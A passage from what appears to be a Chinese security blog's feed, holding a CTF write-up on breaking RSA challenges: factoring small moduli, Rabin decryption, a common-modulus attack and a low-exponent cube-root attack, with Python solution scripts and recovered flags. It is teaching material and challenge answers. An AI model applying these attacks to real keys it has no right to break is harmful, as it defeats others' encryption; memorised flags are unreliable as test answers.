title="解密"></a>解密</h3><p>用私钥(n,d),对c进行解密，得到明文m</p><p> m ≡ cd mod n</p><p>思路：分解n,求p,q,进而得到d,对密文c解密得到明文m<br>解密代码：</p><pre><code class="Python">import gmpy2char=[704796792,752211152,274704164,18414022,368270835,483295235,263072905,459788476,483295235,459788476,663551792,475206804,459788476,428313374,475206804,459788476,425392137,704796792,458265677,341524652,483295235,534149509,425392137,428313374,425392137,341524652,458265677,263072905,483295235,828509797,341524652,425392137,475206804,428313374,483295235,475206804,459788476,306220148]n = 920139713p = 18443q = 49891e = 19d = gmpy2.invert(e,(p-1)*(q-1))for c in char:    print (&#39;%x&#39; % pow(c,d,n)).decode(&#39;hex&#39;)</code></pre><p>解得明文m：flag{13212je2ue28fy71w8u87y31r78eu1e2}</p><h2 id="CTF之RSA"><a href="#CTF之RSA" class="headerlink" title="CTF之RSA"></a>CTF之RSA</h2><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul><li>factordb，Sagemath，yafu</li><li>openssl</li><li>python gmpy2</li><li>rsatool</li></ul><h3 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h3><p>题目来源：<br><a href="http://www.jarvisoj.com" target="_blank" rel="noopener">http://www.jarvisoj.com</a><br><a href="http://www.ichunqiu.com/racing/54627" target="_blank" rel="noopener">http://www.ichunqiu.com/racing/54627</a></p><h4 id="very-easy-RSA"><a href="#very-easy-RSA" class="headerlink" title="very easy RSA"></a>very easy RSA</h4><p>已知RSA公钥生成参数：<br>p = 3487583947589437589237958723892346254777<br>q = 876786784356893476598347658437658389<br>e = 65537<br>求d =<br>(1)</p><pre><code class="Python">q = 876786784356893476598347658437658389e = 65537  t = (p-1)*(q-1)   i=0  while True :       if (1-t*i)%e == 0:           break       i-=1       #print i print &#39;d=&#39; + &#39;%d&#39; % ((1-t*i)/e)</code></pre><p>(2)python gmpy2模块解决</p><pre><code class="Python">p = 3487583947589437589237958723892346254777 q = 876786784356893476598347658437658389e = 65537  d = gmpy2.invert(e,(p-1)*(q-1)) print d</code></pre><p>(3）RSAtool<br><a href="https://github.com/ius/rsatool" target="_blank" rel="noopener">https://github.com/ius/rsatool</a></p><h4 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy RSA"></a>easy RSA</h4><p>已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的<br>公钥：(N=322831561921859,e = 23),求加密字符串<br>N分解为13574881*23781539</p><pre><code class="Python">import gmpy2n = 322831561921859p = 13574881q = 23781539 e = 23 c = int(&#39;0xdc2eeeb2782c&#39;,16)d = gmpy2.invert(e,(p-1)*(q-1)) print (&#39;%x&#39; % pow(c,d,n)).decode(&#39;hex&#39;)</code></pre><h4 id="medium-RSA"><a href="#medium-RSA" class="headerlink" title="medium RSA"></a>medium RSA</h4><p>已知flag.enc和pubkey.pem<br>提取公钥<br>1.利用python的Crypto</p><pre><code class="Python">from Crypto.PublicKey import RSAA = RSA.importKey(open(&#39;pubkey.pem&#39;).read())print &#39;N:&#39; + &#39;%d&#39; % A.nprint &#39;e:&#39; + &#39;%d&#39; % A.e</code></pre><p>N:87924348264132406875276140514499937145050893665602592992418171647042491658461<br>e:65537</p><p>2.openssl</p><pre><code>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pemPublic-Key: (256 bit)Modulus:    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:    be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY----</code></pre><p>3.yafu分解N</p><pre><code>factor(87924348264132406875276140514499937145050893665602592992418171647042491658461)fac: using pretesting plan: normalfac: no tune info: using qs/gnfs crossover of 95 digitsstarting SIQS on c77: 87924348264132406875276140514499937145050893665602592992418171647042491658461==== sieving in progress (1 thread):   36224 relations needed ========           Press ctrl-c to abort and save state           ====SIQS elapsed time = 1.9607 seconds.Total factoring time = 2.0212 seconds***factors found***P39 = 319576316814478949870590164193048041239P39 = 275127860351348928173285174381581152299ans = 1</code></pre><pre><code class="Python">import libnumimport gmpy2f = open(&#39;flag.enc&#39;,&#39;r&#39;)c = f.read()c = libnum.s2n(c)p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239e = 65537d = gmpy2.invert(e,(p-1)*(q-1))n = p*qr = pow(c,d,n)print libnum.n2s(r%n)</code></pre><h4 id="hard-RSA-Rabin密码"><a href="#hard-RSA-Rabin密码" class="headerlink" title="hard RSA(Rabin密码)"></a>hard RSA(Rabin密码)</h4><p>N=87924348264132406875276140514499937145050893665602592992418171647042491658461<br>e=2<br>Rabin密码<br>加密：c = m2 mod n<br>解密：m2 = c mod n<br>n的值为公钥，p和q为私钥,n是可以分解的,分解后可以得到p,q。</p><pre><code class="Python">import libnumimport gmpy2f = open(&#39;flag.enc&#39;,&#39;r&#39;)c = f.read()c = libnum.s2n(c)p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239n = p*qr = pow(c,(p+1)/4,p)s = pow(c,(q+1)/4,q)a = gmpy2.invert(p,q)b = gmpy2.invert(q,p)x =(a*p*s+b*q*r)%ny =(a*p*s-b*q*r)%nprint libnum.n2s(x%n)print libnum.n2s((-x)%n)print libnum.n2s(y%n)print libnum.n2s((-y)%n)</code></pre><h4 id="very-hard-RSA"><a href="#very-hard-RSA" class="headerlink" title="very hard RSA"></a>very hard RSA</h4><p>分析加密脚本，使用了相同的N,不同的e,加密相同的数据,且两个加密指数互素，可以通过共模攻击在两个密文和公钥被嗅探的情况下还原出明文m的值</p><p>两个加密指数互质(e1,e2)=1,即存在s1,s2使得s1e1+s2e2=1<br>c1 ≡ me1 mod n<br>c2 ≡ me2 mod n<br>即 c1s1 c2s2 ≡ m mod n</p><pre><code class="Python">from libnum import n2s,s2nfrom gmpy2 import invertn=0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929Ldef egcd(a, b):  if a == 0:    return (b, 0, 1)  else:    g, y, x = egcd(b % a, a)    return (g, x - (b // a) * y, y)fo1 = open(&#39;flag.enc1&#39;, &#39;rb&#39;)fo2 = open(&#39;flag.enc2&#39;, &#39;rb&#39;)datafo1 = fo1.read()c1 = s2n(datafo1)fo1.close()datafo2 = fo2.read()c2 = s2n(datafo2)fo2.close()c2 = invert(c2,n)e1 = 17e2 = 65537s = egcd(e1,e2)s1 = s[1]s2 = s[2]s2 = - s2m = pow(c1, s1, n) * pow(c2, s2, n) % nprint n2s(m)</code></pre><h4 id="Extremely-hard-RSA"><a href="#Extremely-hard-RSA" class="headerlink" title="Extremely hard RSA"></a>Extremely hard RSA</h4><p>解pubkey.pem发现N特别大，但e=3,可以进行低加密指数攻击<br>在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。<br>即：c ≡ me mod n</p><p>如果e=3，且me &lt; n,<br>那么：c = me , e=3</p><p>如果明文的三次方比n大，但是不是足够大，那么设k，<br>有：c ≡ me +kn<br>爆破k,如果c−kn能开三次根式，那么可以直接得到明文。</p><pre><code class="Python">from libnum import s2n,n2sfrom gmpy2 import irootn=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929e = 3f = open(&#39;flag.enc&#39;,&#39;rb&#39;)c= f.read()c = s2n(c)f.close()i = 0while 1:    res = iroot(c+i*n,3)    if(res[1] == True):        print res        break    print &quot;i=&quot;+str(i)    i = i+1m=440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186print n2s(m)</code></pre><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html</a></p><p><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html</a></p><p><a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3058.html</a></p><p><a href="http://bestwing.me/2016/09/10/Common%20types%20of%20RSA/" target="_blank" rel="noopener">http://bestwing.me/2016/09/10/Common%20types%20of%20RSA/</a></p><p><a href="http://www.bystudent.com/?p=234" target="_blank" rel="noopener">http://www.bystudent.com/?p=234</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（AdiShamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年首次公布，当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。&lt;br&gt;RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。&lt;br&gt;RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。&lt;br&gt;RSA的安全性依赖于大数分解，但是否等同于大数分解一直未能得到理论上的证明，因为没有证明破解RSA就一定需要作大数分解。假设存在一种无须分解大数的算法，那它肯定可以修改成为大数分解算法。 RSA 的一些变种算法已被证明等价于大数分解。不管怎样，分解n是最显然的攻击方法。人们已能分解多个十进制位的大素数。因此，模数n必须选大一些，因具体适用情况而定。&lt;/p&gt;
    
    </summary>
    
    
      <category term="RSA" scheme="http://righte0us.cc/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://righte0us.cc/2017/01/01/hello-world/"/>
    <id>http://righte0us.cc/2017/01/01/hello-world/</id>
    <published>2017-01-01T00:58:08.000Z</published>
    <updated>2017-06-04T05:30:08.172Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="Hello" scheme="http://righte0us.cc/tags/Hello/"/>
    
  </entry>
  
</feed>
